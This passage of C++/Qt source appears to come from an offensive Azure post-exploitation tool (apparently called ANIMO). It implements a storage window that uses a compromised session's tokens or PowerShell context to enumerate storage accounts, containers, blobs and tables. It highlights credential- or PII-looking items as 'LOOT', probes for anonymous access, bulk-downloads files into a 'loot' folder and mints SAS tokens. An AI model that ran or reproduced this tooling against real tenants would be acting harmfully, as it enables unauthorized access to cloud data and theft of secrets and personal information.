                                    if (cname.isEmpty()) continue;
                                    auto *ci = new QTreeWidgetItem(ai);
                                    ci->setText(0, cname); ci->setText(1, "Container");
                                    ci->setData(0, Qt::UserRole, "container");
                                    ci->setExpanded(true);
                                    contItems->insert(acct + "/" + cname, ci);
                                    ++(*contCount);
                                }
                            }
                            --(*containersPending);
                            maybePhase2();
                        });
                    }
                }
                --(*accountsPending);
                maybePhase2();
            });
        }
    });
}

void AzureStorageWindow::enumerateAllPsLegacy() {
    // Phase 1: ARM via PowerShell - accounts + containers (Reader role, no data-plane).
    // Phase 2: REST with storage token - blobs per container (Blob Data Reader).
    auto doEnum = [this](bool gotToken) {
        // ARM script: discover accounts and their containers, no blob listing
        const QString script = QStringLiteral(
            "$res=@();"
            "foreach($sa in (Get-AzStorageAccount)){"
            "  try{$conts=Get-AzRmStorageContainer -StorageAccountName $sa.StorageAccountName "
            "-ResourceGroupName $sa.ResourceGroupName -ErrorAction Stop}catch{$conts=@()};"
            "  if(-not $conts){$res+=[PSCustomObject]@{Account=$sa.StorageAccountName;Container='';RG=$sa.ResourceGroupName}};"
            "  foreach($c in $conts){"
            "    $res+=[PSCustomObject]@{Account=$sa.StorageAccountName;Container=$c.Name;RG=$sa.ResourceGroupName}"
            "  }"
            "}"
            "$res | ConvertTo-Json -Compress");

        appendLog("[*] Enumerating all storage (accounts + containers via ARM)...", "cyan");
        storageTree->clear();
        setLoading(true);
        runPs(script, [this, gotToken](bool ok, const QString &out) {
            if (!ok) {
                setLoading(false);
                appendLog("[-] ARM enumeration failed:", "red");
                appendLog(out.trimmed(), "gray");
                return;
            }
            const QJsonArray arr = parsePsJsonArray(out);
            QMap<QString, QTreeWidgetItem*> accItems;
            QMap<QString, QTreeWidgetItem*> contItems;
            int contCount = 0;
            for (const QJsonValue &v : arr) {
                const QJsonObject o = v.toObject();
                const QString acct = o.value("Account").toString();
                const QString cont = o.value("Container").toString();
                if (acct.isEmpty()) continue;

                QTreeWidgetItem *ai = accItems.value(acct);
                if (!ai) {
                    ai = new QTreeWidgetItem(storageTree);
                    ai->setText(0, acct); ai->setText(1, "Account");
                    ai->setData(0, Qt::UserRole, "account");
                    ai->setExpanded(true);
                    accItems.insert(acct, ai);
                }
                if (cont.isEmpty()) continue;
                const QString ckey = acct + "/" + cont;
                if (!contItems.contains(ckey)) {
                    auto *ci = new QTreeWidgetItem(ai);
                    ci->setText(0, cont); ci->setText(1, "Container");
                    ci->setData(0, Qt::UserRole, "container");
                    ci->setExpanded(true);
                    contItems.insert(ckey, ci);
                    ++contCount;
                }
            }
            appendLog(QString("[+] Found %1 account(s), %2 container(s)").arg(accItems.size()).arg(contCount), "green");

            if (!gotToken || contItems.isEmpty()) {
                setLoading(false);
                if (!gotToken && contCount > 0)
                    appendLog("[!] No storage token - blob listing skipped. Double-click a container to retry.", "yellow");
                return;
            }

            // Phase 2: list blobs via REST for each container
            appendLog("[*] Listing blobs via REST...", "cyan");
            auto pending = std::make_shared<int>(contItems.size());
            auto totalBlobs = std::make_shared<int>(0);
            auto totalLoot = std::make_shared<int>(0);
            for (auto it = contItems.constBegin(); it != contItems.constEnd(); ++it) {
                const QString acct = it.key().section('/', 0, 0);
                const QString cont = it.key().section('/', 1);
                QTreeWidgetItem *ci = it.value();
                const QString host = accountHostFor(acct);
                const QString url = QString("%1/%2?restype=container&comp=list").arg(host, cont);
                QNetworkReply *reply = track(net->get(dataRequest(url)));
                if (!reply) { --(*pending); continue; }
                connect(reply, &QNetworkReply::finished, this,
                        [this, reply, ci, pending, totalBlobs, totalLoot]() {
                    reply->deleteLater();
                    activeReplies.removeOne(reply);
                    if (reply->error() == QNetworkReply::NoError) {
                        const QString xml = QString::fromUtf8(reply->readAll());
                        QRegularExpression blobRe("<Blob>([\\s\\S]*?)</Blob>");
                        QRegularExpression nameRe("<Name>([^<]+)</Name>");
                        QRegularExpression sizeRe("<Content-Length>([^<]+)</Content-Length>");
                        auto bit = blobRe.globalMatch(xml);
                        while (bit.hasNext()) {
                            const QString e = bit.next().captured(1);
                            const QString name = nameRe.match(e).captured(1);
                            const qint64 bytes = sizeRe.match(e).captured(1).toLongLong();
                            auto *bi = new QTreeWidgetItem(ci);
                            bi->setText(0, name); bi->setText(1, "Blob");
                            bi->setText(2, humanSize(bytes));
                            bi->setData(0, Qt::UserRole, "blob");
                            if (isLootName(name)) {
                                bi->setText(4, "LOOT");
                                for (int c = 0; c < 5; ++c)
                                    bi->setForeground(c, StyleManager::colorForAuditAction("token"));
                                ++(*totalLoot);
                            }
                            ++(*totalBlobs);
                        }
                    }
                    if (--(*pending) <= 0) {
                        setLoading(false);
                        appendLog(QString("[+] Enumerated %1 blob(s)%2")
                                      .arg(*totalBlobs)
                                      .arg(*totalLoot ? QString(", %1 flagged LOOT").arg(*totalLoot) : QString()),
                                  *totalLoot ? "yellow" : "green");
                    }
                });
            }
        });
    };

    // Ensure we have a storage token before starting
    if (hasStorageToken()) {
        doEnum(true);
    } else {
        acquireStorageToken([doEnum](bool ok) { doEnum(ok); });
    }
}

void AzureStorageWindow::listContainers() {
    currentStorageAccount = accountInput->text().trimmed();
    if (currentStorageAccount.isEmpty()) {
        QMessageBox::warning(this, "No account", "Enter a storage account name first.");
        return;
    }
    storageTree->clear();

    // Tables live at <acct>.table.core.windows.net with a JSON-only API. The
    // shared REST/PS split doesn't apply - PowerShell fallback needs Az.Storage +
    // Get-AzStorageTable which is a separate module. Require OAuth for now.
    const bool tableSvc = serviceCombo->currentText().startsWith("Table");
    if (tableSvc) {
        if (hasStorageToken()) { listTablesRest(); return; }
        acquireStorageToken([this](bool ok) {
            if (ok) listTablesRest();
            else appendLog("[-] No storage.azure.com token - Tables require OAuth (Blob/File support PS fallback).", "red");
        });
        return;
    }

    if (hasStorageToken()) { listContainersRest(); return; }
    acquireStorageToken([this](bool ok) {
        if (ok) listContainersRest();
        else listContainersPs();
    });
}

void AzureStorageWindow::listKnownContainer() {
    currentStorageAccount = accountInput->text().trimmed();
    const QString c = containerInput->text().trimmed();
    if (currentStorageAccount.isEmpty() || c.isEmpty()) {
        QMessageBox::warning(this, "Missing input", "Enter a storage account and a known container / share / table name.");
        return;
    }
    storageTree->clear();
    auto *item = new QTreeWidgetItem(storageTree);
    item->setText(0, c);
    const QString sel = serviceCombo->currentText();
    QString kind;
    if      (sel.startsWith("File"))  kind = "Share";
    else if (sel.startsWith("Table")) kind = "Table";
    else                              kind = "Container";
    item->setText(1, kind);
    item->setData(0, Qt::UserRole, kind == "Table" ? "table" : "container");
    storageTree->setCurrentItem(item);

    if (sel.startsWith("Table")) {
        if (hasStorageToken()) { queryTableEntitiesRest(item); return; }
        acquireStorageToken([this, item](bool ok) {
            if (ok) queryTableEntitiesRest(item);
            else appendLog("[-] No storage.azure.com token - Tables require OAuth.", "red");
        });
        return;
    }

    if (hasStorageToken()) { listBlobsRest(item); return; }
    acquireStorageToken([this, item](bool ok) {
        if (ok) listBlobsRest(item);
        else listBlobsPs(item);
    });
}

void AzureStorageWindow::listContainersRest() {
    const bool file = serviceCombo->currentText().startsWith("File");
    appendLog(QString("[*] Listing %1 in %2 (REST)...").arg(file ? "shares" : "containers", currentStorageAccount), "cyan");

    const QString url = accountHost() + "/?comp=list";
    QNetworkReply *reply = track(net->get(dataRequest(url)));
    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
    setLoading(true);

    connect(reply, &QNetworkReply::finished, this, [this, reply, file]() {
        reply->deleteLater();
        activeReplies.removeOne(reply);
        setLoading(false);

        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            const int status = NetworkHelper::getHttpStatus(reply);
            appendLog(QString("[-] REST error (%1): %2").arg(status).arg(NetworkHelper::parseApiError(reply)), "red");
            if (status == 403 || status == 401) {
                appendLog("[*] Falling back to PowerShell (Az.Storage)...", "yellow");
                listContainersPs();
            }
            return;
        }

        const QString xml = QString::fromUtf8(reply->readAll());
        QRegularExpression nameRe("<Name>([^<]+)</Name>");
        auto it = nameRe.globalMatch(xml);
        int count = 0;
        while (it.hasNext()) {
            const QString name = it.next().captured(1);
            auto *item = new QTreeWidgetItem(storageTree);
            item->setText(0, name);
            item->setText(1, file ? "Share" : "Container");
            item->setData(0, Qt::UserRole, "container");
            ++count;
        }
        appendLog(count ? QString("[+] Found %1").arg(count) : QStringLiteral("[!] None found (or no list permission)."),
                  count ? "green" : "yellow");
    });
}

void AzureStorageWindow::listContainersPs() {
    const bool file = serviceCombo->currentText().startsWith("File");
    const QString acct = accountInput->text().trimmed();
    QString script;
    if (file) {
        // File shares: Get-AzStorageShare needs $ctx (no ARM equivalent)
        script = QString("%1; Get-AzStorageShare -Context $ctx | Select-Object Name | ConvertTo-Json -Compress")
                     .arg(psContextSetup());
    } else {
        // Blob containers via ARM (Reader role, no listKeys)
        script = QString("%1; $sa=Get-AzStorageAccount | Where-Object {$_.StorageAccountName -eq '%2'};"
                         "if($sa){Get-AzRmStorageContainer -StorageAccountName $sa.StorageAccountName "
                         "-ResourceGroupName $sa.ResourceGroupName | Select-Object Name | ConvertTo-Json -Compress}"
                         "else{Write-Error 'Account %2 not found in subscription'}")
                     .arg(psContextSetup(), acct);
    }
    appendLog("[*] Listing via PowerShell...", "cyan");
    setLoading(true);
    runPs(script, [this, file](bool ok, const QString &out) {
        setLoading(false);
        if (!ok) {
            appendLog("[-] PowerShell listing failed:", "red");
            appendLog(out.trimmed(), "gray");
            if (out.contains("AccessTokenAuthenticator") || out.contains("failed to retrieve access token")) {
                appendLog("[!] This session can't mint a storage token for -UseConnectedAccount. "
                          "Select a session logged in with credentials (Connect-AzAccount -Credential); "
                          "an access-token login has no token cache to acquire the storage-audience token.", "yellow");
            } else if (out.contains("AuthorizationFailure") || out.contains("does not have permission")) {
                appendLog("[!] The identity lacks the data role on this scope (need e.g. Storage Blob Data Reader).", "yellow");
            }
            return;
        }

        const QJsonArray arr = parsePsJsonArray(out);
        int count = 0;
        for (const QJsonValue &v : arr) {
            const QString name = v.toObject().value("Name").toString();
            if (name.isEmpty()) continue;
            auto *item = new QTreeWidgetItem(storageTree);
            item->setText(0, name);
            item->setText(1, file ? "Share" : "Container");
            item->setData(0, Qt::UserRole, "container");
            ++count;
        }
        appendLog(count ? QString("[+] Found %1 (PowerShell)").arg(count) : QStringLiteral("[!] None found."),
                  count ? "green" : "yellow");
    });
}

// ============================================================================
// List blobs / files
// ============================================================================

void AzureStorageWindow::listChildren() {
    auto *item = storageTree->currentItem();
    if (!item) return;
    const QString kind = item->data(0, Qt::UserRole).toString();

    currentStorageAccount = accountForItem(item);
    while (item->childCount() > 0) delete item->takeChild(0);

    if (kind == "table") {
        if (hasStorageToken()) { queryTableEntitiesRest(item); return; }
        acquireStorageToken([this, item](bool ok) {
            if (ok) queryTableEntitiesRest(item);
            else appendLog("[-] No storage.azure.com token - Tables require OAuth.", "red");
        });
        return;
    }
    if (kind != "container") return;

    if (hasStorageToken()) { listBlobsRest(item); return; }
    acquireStorageToken([this, item](bool ok) {
        if (ok) listBlobsRest(item);
        else listBlobsPs(item);
    });
}

void AzureStorageWindow::listBlobsRest(QTreeWidgetItem *containerItem) {
    const bool file = serviceCombo->currentText().startsWith("File");
    const QString container = containerItem->text(0);
    appendLog(QString("[*] Listing %1/%2 (REST)...").arg(currentStorageAccount, container), "cyan");

    const QString url = file
        ? QString("%1/%2?restype=directory&comp=list").arg(accountHost(), container)
        : QString("%1/%2?restype=container&comp=list").arg(accountHost(), container);

    QNetworkReply *reply = track(net->get(dataRequest(url)));
    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
    setLoading(true);

    connect(reply, &QNetworkReply::finished, this, [this, reply, containerItem, file]() {
        reply->deleteLater();
        activeReplies.removeOne(reply);
        setLoading(false);

        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            const int status = NetworkHelper::getHttpStatus(reply);
            appendLog(QString("[-] REST error (%1): %2").arg(status).arg(NetworkHelper::parseApiError(reply)), "red");
            if (status == 403 || status == 401) { appendLog("[*] Falling back to PowerShell...", "yellow"); listBlobsPs(containerItem); }
            return;
        }

        const QString xml = QString::fromUtf8(reply->readAll());
        const QString entryTag = file ? "File" : "Blob";
        QRegularExpression entryRe(QString("<%1>([\\s\\S]*?)</%1>").arg(entryTag));
        QRegularExpression nameRe("<Name>([^<]+)</Name>");
        QRegularExpression sizeRe("<Content-Length>([^<]+)</Content-Length>");
        QRegularExpression modRe("<Last-Modified>([^<]+)</Last-Modified>");

        auto it = entryRe.globalMatch(xml);
        int count = 0, loot = 0;
        while (it.hasNext()) {
            const QString e = it.next().captured(1);
            const QString name = nameRe.match(e).captured(1);
            const qint64 bytes = sizeRe.match(e).captured(1).toLongLong();

            auto *blobItem = new QTreeWidgetItem(containerItem);
            blobItem->setText(0, name);
            blobItem->setText(1, file ? "File" : "Blob");
            blobItem->setText(2, humanSize(bytes));
            blobItem->setText(3, modRe.match(e).captured(1));
            blobItem->setData(0, Qt::UserRole, "blob");
            if (isLootName(name)) {
                blobItem->setText(4, "LOOT");
                for (int c = 0; c < 5; ++c) blobItem->setForeground(c, StyleManager::colorForAuditAction("token")); // gold
                ++loot;
            }
            ++count;
        }
        containerItem->setExpanded(true);
        appendLog(QString("[+] %1 item(s)%2").arg(count).arg(loot ? QString(", %1 flagged LOOT").arg(loot) : QString()),
                  loot ? "yellow" : "green");
    });
}

void AzureStorageWindow::listBlobsPs(QTreeWidgetItem *containerItem) {
    const bool file = serviceCombo->currentText().startsWith("File");
    const QString container = containerItem->text(0);
    const QString getCmd = file
        ? QString("Get-AzStorageFile -ShareName '%1'").arg(container)
        : QString("Get-AzStorageBlob -Container '%1'").arg(container);
    const QString script = QString("%1; %2 -Context $ctx | Select-Object Name,Length,LastModified | ConvertTo-Json -Compress")
                               .arg(psContextSetup(), getCmd);
    appendLog("[*] Listing via PowerShell...", "cyan");
    setLoading(true);
    runPs(script, [this, containerItem, file](bool ok, const QString &out) {
        setLoading(false);
        if (!ok) {
            appendLog("[-] PowerShell listing failed:", "red");
            appendLog(out.trimmed(), "gray");
            if (out.contains("AccessTokenAuthenticator") || out.contains("failed to retrieve access token")) {
                appendLog("[!] This session can't mint a storage token for -UseConnectedAccount. "
                          "Select a session logged in with credentials (Connect-AzAccount -Credential); "
                          "an access-token login has no token cache to acquire the storage-audience token.", "yellow");
            } else if (out.contains("AuthorizationFailure") || out.contains("does not have permission")) {
                appendLog("[!] The identity lacks the data role on this scope (need e.g. Storage Blob Data Reader).", "yellow");
            }
            return;
        }
        const QJsonArray arr = parsePsJsonArray(out);
        int count = 0, loot = 0;
        for (const QJsonValue &v : arr) {
            const QJsonObject o2 = v.toObject();
            const QString name = o2.value("Name").toString();
            if (name.isEmpty()) continue;
            auto *item = new QTreeWidgetItem(containerItem);
            item->setText(0, name);
            item->setText(1, file ? "File" : "Blob");
            item->setText(2, humanSize(qint64(o2.value("Length").toDouble())));
            item->setData(0, Qt::UserRole, "blob");
            if (isLootName(name)) {
                item->setText(4, "LOOT");
                for (int c = 0; c < 5; ++c) item->setForeground(c, StyleManager::colorForAuditAction("token"));
                ++loot;
            }
            ++count;
        }
        containerItem->setExpanded(true);
        appendLog(QString("[+] %1 item(s) (PowerShell)%2").arg(count).arg(loot ? QString(", %1 LOOT").arg(loot) : QString()),
                  loot ? "yellow" : "green");
    });
}

// ============================================================================
// Storage Tables (OAuth via storage.azure.com)
// ============================================================================

void AzureStorageWindow::listTablesRest() {
    appendLog(QString("[*] Listing tables in %1 (REST)...").arg(currentStorageAccount), "cyan");
    const QString url = accountHost() + "/Tables";
    QNetworkReply *reply = track(net->get(dataRequest(url)));
    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
    setLoading(true);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        reply->deleteLater();
        activeReplies.removeOne(reply);
        setLoading(false);

        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            const int status = NetworkHelper::getHttpStatus(reply);
            appendLog(QString("[-] REST error (%1): %2")
                          .arg(status).arg(NetworkHelper::parseApiError(reply)), "red");
            if (status == 403 || status == 401) {
                appendLog("[!] Table needs Storage Table Data Reader (or higher) at the account or table scope.", "yellow");
            }
            return;
        }

        const QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
        const QJsonArray arr = doc.object().value("value").toArray();
        int count = 0;
        for (const QJsonValue &v : arr) {
            const QString name = v.toObject().value("TableName").toString();
            if (name.isEmpty()) continue;
            auto *item = new QTreeWidgetItem(storageTree);
            item->setText(0, name);
            item->setText(1, "Table");
            item->setData(0, Qt::UserRole, "table");
            ++count;
        }
        appendLog(count ? QString("[+] Found %1 table(s). Double-click one to query entities.").arg(count)
                        : QStringLiteral("[!] No tables found (or no list permission)."),
                  count ? "green" : "yellow");
    });
}

void AzureStorageWindow::queryTableEntitiesRest(QTreeWidgetItem *tableItem) {
    const QString table = tableItem->text(0);
    // $top=1000 is Azure's server-side cap per response. Continuation tokens
    // extend it further, which we don't implement in this first cut - most
    // recon-target tables are well under that limit and the log dump makes it
    // obvious when the operator hits the ceiling.
    const QString url = QString("%1/%2()?$top=1000").arg(accountHost(), table);
    appendLog(QString("[*] Querying entities in %1/%2 (top 1000)...").arg(currentStorageAccount, table), "cyan");
    QNetworkReply *reply = track(net->get(dataRequest(url)));
    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
    setLoading(true);

    connect(reply, &QNetworkReply::finished, this, [this, reply, tableItem, table]() {
        reply->deleteLater();
        activeReplies.removeOne(reply);
        setLoading(false);

        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            const int status = NetworkHelper::getHttpStatus(reply);
            appendLog(QString("[-] REST error (%1): %2")
                          .arg(status).arg(NetworkHelper::parseApiError(reply)), "red");
            return;
        }

        const QByteArray body = reply->readAll();
        const QJsonDocument doc = QJsonDocument::fromJson(body);
        const QJsonArray rows = doc.object().value("value").toArray();

        // Populate tree: one child per entity, first column = "PartitionKey/RowKey",
        // second column = compact JSON of the remaining fields. The full JSON also
        // goes to logOutput so operators can copy the raw payload for scripting.
        for (const QJsonValue &v : rows) {
            QJsonObject o = v.toObject();
            const QString pk = o.take("PartitionKey").toString();
            const QString rk = o.take("RowKey").toString();
            o.remove("Timestamp");
            o.remove("odata.etag");

            auto *item = new QTreeWidgetItem(tableItem);
            item->setText(0, QString("%1 / %2").arg(pk, rk));
            item->setText(1, "Entity");
            item->setText(2, QString::fromUtf8(QJsonDocument(o).toJson(QJsonDocument::Compact)));
            item->setData(0, Qt::UserRole, "entity");
            // Loot heuristic: flag entities with values that look like creds or PII.
            for (auto it = o.constBegin(); it != o.constEnd(); ++it) {
                const QString sVal = it.value().toString();
                if (isLootName(it.key()) || isLootName(sVal)) {
                    item->setText(4, "LOOT");
                    for (int c = 0; c < 5; ++c)
                        item->setForeground(c, StyleManager::colorForAuditAction("token"));
                    break;
                }
            }
        }
        tableItem->setExpanded(true);
        appendLog(QString("[+] %1 entity/entities returned. Full payload below:").arg(rows.size()),
                  rows.isEmpty() ? "yellow" : "green");
        appendLog(QString::fromUtf8(QJsonDocument(doc.object().value("value").toArray())
                                        .toJson(QJsonDocument::Indented)), "gray");
    });
}

void AzureStorageWindow::onTreeItemClicked(QTreeWidgetItem *, int) { /* selection handled on demand */ }

// ============================================================================
// Public access probe
// ============================================================================

void AzureStorageWindow::checkPublicAccess() {
    auto *item = storageTree->currentItem();
    currentStorageAccount = accountForItem(item);
    if (!item || item->data(0, Qt::UserRole).toString() != "container") {
        QMessageBox::information(this, "Select a container", "Select a container/share to test for anonymous read.");
        return;
    }
    const QString container = item->text(0);
    const QString url = QString("%1/%2?restype=container&comp=list").arg(accountHost(), container);
    appendLog(QString("[*] Probing anonymous access to %1...").arg(container), "cyan");

    QNetworkReply *reply = track(net->get(dataRequest(url, /*anonymous=*/true)));
    if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
    connect(reply, &QNetworkReply::finished, this, [this, reply, container]() {
        reply->deleteLater();
        activeReplies.removeOne(reply);
        const int status = NetworkHelper::getHttpStatus(reply);
        if (status == 200) {
            appendLog(QString("[!!] PUBLIC: %1 allows anonymous read (no auth needed).").arg(container), "red");
        } else {
            appendLog(QString("[+] Not public (HTTP %1).").arg(status), "green");
        }
    });
}

// ============================================================================
// Download
// ============================================================================

void AzureStorageWindow::downloadSelected() {
    auto *item = storageTree->currentItem();
    if (!item || item->data(0, Qt::UserRole).toString() != "blob") {
        QMessageBox::information(this, "Select a file", "Select a blob/file to download.");
        return;
    }
    QTreeWidgetItem *parent = item->parent();
    if (!parent) return;
    currentStorageAccount = accountForItem(item);
    const QString container = parent->text(0);
    const QString name = item->text(0);
    const bool file = serviceCombo->currentText().startsWith("File");

    auto doRestDownload = [this, name, container]() {
        const QString savePath = QFileDialog::getSaveFileName(this, "Save", name.split('/').last(), "All Files (*)");
        if (savePath.isEmpty()) return;
        const QString url = QString("%1/%2/%3").arg(accountHost(), container, name);
        appendLog(QString("[*] Downloading %1 (REST)...").arg(name), "cyan");
        QNetworkReply *reply = track(net->get(dataRequest(url)));
        if (!reply) { appendLog("[-] Failed to create request", "red"); return; }
        connect(reply, &QNetworkReply::finished, this, [this, reply, savePath, name]() {
            reply->deleteLater();
            activeReplies.removeOne(reply);
            QString err;
            if (!NetworkHelper::isReplySuccess(reply, &err)) {
                appendLog(QString("[-] Download failed: %1").arg(NetworkHelper::parseApiError(reply)), "red");
                return;
            }
            QFile f(savePath);
            if (!f.open(QIODevice::WriteOnly)) { appendLog("[-] Could not open file for writing.", "red"); return; }
            f.write(reply->readAll());
            f.close();
            appendLog(QString("[+] Downloaded %1 to %2").arg(name, savePath), "green");
        });
    };

    if (hasStorageToken()) { doRestDownload(); return; }
    acquireStorageToken([this, doRestDownload, file, container, name](bool ok) { if (ok) { doRestDownload(); return; }

    // PowerShell download - saves on the ANIMO server host
    const QString getCmd = file
        ? QString("Get-AzStorageFileContent -ShareName '%1' -Path '%2' -Destination 'loot' -Force -Context $ctx")
              .arg(container, name)
        : QString("Get-AzStorageBlobContent -Container '%1' -Blob '%2' -Destination 'loot' -Force -Context $ctx")
              .arg(container, name);
    appendLog(QString("[*] Downloading %1 to ./loot on the ANIMO host...").arg(name), "yellow");
    runPs(QString("New-Item -ItemType Directory -Force -Path loot | Out-Null; %1; %2")
              .arg(psContextSetup(), getCmd),
          [this, name](bool ok, const QString &out) {
              appendLog(ok ? QString("[+] Saved %1 to ./loot on the ANIMO server host.").arg(name)
                           : QString("[-] Download failed: %1").arg(out.trimmed()), ok ? "green" : "red");
          });
    });
}

void AzureStorageWindow::bulkDownloadSelected() {
    QList<QTreeWidgetItem*> blobs;
    for (QTreeWidgetItem *it : storageTree->selectedItems())
        if (it->data(0, Qt::UserRole).toString() == "blob" && it->parent()) blobs.append(it);
    if (blobs.isEmpty()) {
        QMessageBox::information(this, "No files selected", "Select one or more blobs/files (Ctrl/Shift-click).");
        return;
    }

    auto doRestBulk = [this, blobs]() {
        const QString dir = QFileDialog::getExistingDirectory(this, "Loot folder");
        if (dir.isEmpty()) return;
        appendLog(QString("[*] Bulk downloading %1 file(s) to %2...").arg(blobs.size()).arg(dir), "cyan");
        for (QTreeWidgetItem *it : blobs) {
            const QString container = it->parent()->text(0);
            const QString name = it->text(0);
            currentStorageAccount = accountForItem(it);
            const QString url = QString("%1/%2/%3").arg(accountHost(), container, name);
            const QString outPath = QDir(dir).filePath(name.split('/').last());
            QNetworkReply *reply = track(net->get(dataRequest(url)));
            if (!reply) continue;
            connect(reply, &QNetworkReply::finished, this, [this, reply, outPath, name]() {
                reply->deleteLater();
                activeReplies.removeOne(reply);
                QString err;
                if (!NetworkHelper::isReplySuccess(reply, &err)) {
                    appendLog(QString("[-] %1: %2").arg(name, NetworkHelper::parseApiError(reply)), "red");
                    return;
                }
                QFile f(outPath);
                if (f.open(QIODevice::WriteOnly)) { f.write(reply->readAll()); f.close(); appendLog(QString("[+] %1").arg(name), "green"); }
                else appendLog(QString("[-] Could not write %1").arg(outPath), "red");
            });
        }
    };

    if (hasStorageToken()) { doRestBulk(); return; }
    acquireStorageToken([this, doRestBulk, blobs](bool ok) {
        if (ok) { doRestBulk(); return; }
        appendLog(QString("[*] Bulk downloading %1 file(s) to ./loot on the ANIMO host...").arg(blobs.size()), "cyan");
        for (QTreeWidgetItem *it : blobs) {
            const QString container = it->parent()->text(0);
            const QString name = it->text(0);
            currentStorageAccount = accountForItem(it);
            const bool file = serviceCombo->currentText().startsWith("File");
            const QString getCmd = file
                ? QString("Get-AzStorageFileContent -ShareName '%1' -Path '%2' -Destination 'loot' -Force -Context $ctx")
                      .arg(container, name)
                : QString("Get-AzStorageBlobContent -Container '%1' -Blob '%2' -Destination 'loot' -Force -Context $ctx")
                      .arg(container, name);
            runPs(QString("New-Item -ItemType Directory -Force -Path loot | Out-Null; %1; %2")
                      .arg(psContextSetup(), getCmd),
                  [this, name](bool ok, const QString &out) {
                      appendLog(ok ? QString("[+] %1").arg(name) : QString("[-] %1: %2").arg(name, out.trimmed()),
                                ok ? "green" : "red");
                  });
        }
    });
}

void AzureStorageWindow::generateSas() {
    auto *item = storageTree->currentItem();
    currentStorageAccount = accountForItem(item);
    if (currentStorageAccount.isEmpty()) { QMessageBox::warning(this, "No account", "Enter a storage account."); return; }
    if (!psAvailable()) {
        QMessageBox::information(this, "PowerShell needed", "SAS generation uses Az.Storage in the selected session.");
        return;
    }
    QString cmd;
    if (item && item->data(0, Qt::UserRole).toString() == "container") {
        cmd = QString("New-AzStorageContainerSASToken -Name '%1' -Permission rl -ExpiryTime (Get-Date).AddHours(2) -Context $ctx")
                  .arg(item->text(0));
    } else {
        cmd = "New-AzStorageAccountSASToken -Service Blob,File -ResourceType Service,Container,Object "
              "-Permission rl -ExpiryTime (Get-Date).AddHours(2) -Context $ctx";
    }
    appendLog("[*] Generating SAS via PowerShell...", "cyan");
    runPs(QString("%1; %2").arg(psContextSetup(), cmd), [this](bool ok, const QString &out) {
        const QString sas = out.trimmed();
        if (ok && sas.contains("sig=")) {
            sasInput->setText(sas.startsWith('?') ? sas : "?" + sas);
            appendLog(QString("[+] SAS generated and placed in the SAS field: %1").arg(sas.left(40) + "..."), "green");
        } else {
            appendLog("[-] SAS generation failed (needs an account-key context):", "red");
            appendLog(sas, "gray");
        }
    });
}

void AzureStorageWindow::copyUrl() {
    auto *item = storageTree->currentItem();
    if (!item) { QMessageBox::information(this, "No selection", "Select a container or blob."); return; }
    currentStorageAccount = accountForItem(item);
    const QString type = item->data(0, Qt::UserRole).toString();
    QString url;
    if (type == "container") url = QString("%1/%2").arg(accountHost(), item->text(0));
    else if (type == "blob" && item->parent()) url = QString("%1/%2/%3").arg(accountHost(), item->parent()->text(0), item->text(0));
    else return;
    QApplication::clipboard()->setText(url);
    appendLog("[+] URL copied to clipboard", "green");
}

// ============================================================================
// Tokens / status / misc
// ============================================================================

void AzureStorageWindow::autoFetchTokens() {
    // No-op: session auth is handled by Connect-AzAccount at login time.
    // The session's credential context provides storage access directly.
    appendLog("[*] Session uses connected-account auth. No separate token fetch needed.", "cyan");
}

void AzureStorageWindow::onUserChanged(const QString &) {
    storageTree->clear();
    storageTokenInput->clear();
    const QString sid = userSelector->selectedSession();
    if (sid.isEmpty()) return;

    // Check if we already have a storage token cached
    TokenInfo st = TokenStore::instance()->getTokenForSessionAndResource(sid, QStringLiteral("https://storage.azure.com"));
    if (!st.accessToken.isEmpty()) {
        storageTokenInput->setText(st.accessToken);
        appendLog("[+] Storage token available for this session", "lime");
        return;
    }
    // No cached token - try to exchange the session's refresh token
    acquireStorageToken();
}

void AzureStorageWindow::updateTokenStatus() {
    // No visible token fields to update
}

void AzureStorageWindow::setLoading(bool loading) {
    progressBar->setVisible(loading);
    listContainersBtn->setEnabled(!loading);
    listBlobsBtn->setEnabled(!loading);
    listAccountsBtn->setEnabled(!loading);
    cancelBtn->setEnabled(loading);
    if (!loading) cancelRequested = false;
}

void AzureStorageWindow::cancelRequests() {
    cancelRequested = true;
    appendLog("[!] Cancelling requests...", "yellow");
    for (QNetworkReply *reply : activeReplies)
        if (reply && !reply->isFinished()) reply->abort();
    activeReplies.clear();
    setLoading(false);
}